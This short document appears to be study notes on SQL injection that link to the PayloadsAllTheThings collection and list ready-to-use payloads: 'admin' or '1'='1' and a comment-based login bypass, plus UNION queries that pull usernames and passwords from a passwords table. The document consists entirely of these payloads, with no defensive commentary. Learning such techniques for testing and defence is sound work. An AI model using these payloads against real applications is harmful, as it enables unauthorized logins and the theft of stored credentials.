
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

Using OR for authentication bypass
```SQL
admin' or '1'='1
```

Using comments for authentication bypass
```SQL
admin'--
```

Union statements
```SQL
SELECT * FROM ports UNION SELECT * FROM ships;
```
```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

